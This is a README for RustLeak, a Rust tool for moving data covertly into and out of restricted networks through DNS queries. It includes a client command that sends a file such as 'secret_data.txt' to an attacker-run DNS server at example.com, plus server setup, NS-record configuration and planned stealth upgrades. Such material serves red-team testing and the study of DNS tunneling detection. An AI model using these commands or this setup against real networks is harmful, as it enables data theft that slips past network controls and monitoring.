# **RustLeak**

**RustLeak** is a lightweight and stealthy DNS-based data exfiltration and infiltration toolkit, built with Rust. It can be used in a restricted environment. It consists of two main components:

- **`rustleak-server`**: The custom DNS server that processes data through DNS queries.
- **`rustleak-client`**: The client tool to send or receive data using the server.

---

## **Important Notice**
- You need to set up and host the DNS Server.
- Update your DNS provider settings to redirect DNS traffic to your server.

**Note**: Actual speed is limited:
- **Upload**: ~250 Bytes/s
- **Download**: ~230 Bytes/s

---

## **Features**
- **Custom DNS Server**: Handles DNS zones and processes encoded data.
- **Exfiltration and Infiltration**: Transmit or receive data using DNS queries and responses.
- **Command-Line Interface (CLI)**: Simple commands for sending and receiving data.

---

## **How It Works**
- **Exfiltration**: The client (`rustleak-client`) sends data embedded in DNS queries to the server (`rustleak-server`), which decodes and stores it.
- **Infiltration**: The server responds with data embedded in DNS responses, and the client decodes the received data.

---

## **Possible Upgrades**
- **Single Encryption**: Encrypt data for stealth (Restricted Host <--> DNS Server).
- **Dual Encryption**: Encrypt data for full stealth (Restricted Host <--> DNS Server <--> External Host).
- **Record Type Rotation**: Support additional DNS record types beyond TXT records.
- **Upload Speed Upgrade**: Transfer more labels in upload queries.
- **Download Speed Upgrade**: Transfer more data per download query.

---

## **Installation**

### Prerequisites
- Rust (latest stable version)
- Cargo (Rust package manager)

### Clone the Repository
\`\`\`bash
git clone https://github.com/Natounet/RustLeak.git
cd RustLeak
\`\`\`

### Build the Tools
\`\`\`bash
cargo build --release
\`\`\`

---

## **Usage**

### **Client: \`rustleak-client\`**
The client provides commands to send or receive data via DNS queries. Below are the supported commands:

#### **Send Data**
Use the \`Send\` command to exfiltrate data:
\`\`\`bash
rustleak-client send --code <unique_code> --filename <file_to_send> --domain <dns_server_domain>
\`\`\`

**Options**:
- \`--code\`: A unique identifier for the data being sent.
- \`--filename\`: Path to the file containing the data to be sent.
- \`--domain\`: The domain name managed by the DNS server.

**Example**:
\`\`\`bash
rustleak-client send --code test123 --filename secret_data.txt --domain example.com
\`\`\`

![upload](https://github.com/user-attachments/assets/cb1cfe8d-8ff6-4c0f-a24a-2f25a153ece6)



#### **Receive Data**
Use the \`Receive\` command to retrieve data:
\`\`\`bash
rustleak-client receive --code <unique_code> --filename <output_file> --domain <dns_server_domain>
\`\`\`

**Options**:
- \`--code\`: The unique identifier for the data to retrieve.
- \`--filename\`: Path to the file where the received data will be saved.
- \`--domain\`: The domain name managed by the DNS server.

**Example**:
\`\`\`bash
rustleak-client receive --code test123 --filename received_data.txt --domain example.com
\`\`\`

![download](https://github.com/user-attachments/assets/bd13898f-bcdc-4ddf-8241-50bf65275ed4)


---

### **Server: \`rustleak-server\`**
The server handles DNS queries for a specific domain.

#### **Start the Server**
Run the server and specify the DNS zone to manage:
\`\`\`bash
rustleak-server --domain <dns_zone> 
\`\`\`

**Options**:
- \`--domain\`: The DNS zone to manage (e.g., \`example.com\`).
- \`--port\`: The port for the DNS server (default: 53).
- \`--output\`: File to save data received from clients.

**Example**:
\`\`\`bash
rustleak-server --domain example.com 
\`\`\`

---

## **Deployment**

To deploy \`rustleak-server\` online:
1. Obtain a domain name (e.g., \`example.com\`) and configure its DNS records.
2. Point your domain's **NS record** to the public IP of the machine running \`rustleak-server\`.
3. Start the server with the appropriate domain.

**DNS Configuration Example**:
\`\`\`plaintext
example.com.    IN NS   <server-public-ip>
\`\`\`

---

## **License**
This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

## **Contributing**
Contributions are welcome! Feel free to submit issues or pull requests for bug fixes or new features.

---

## **Disclaimer**
This tool is intended for **educational purposes** and authorized security testing only. The developer is not responsible for any misuse of this tool.

---

## **Contact**
For any questions or feedback, please open an issue on the [GitHub repository](https://github.com/Natounet/RustLeak).

---
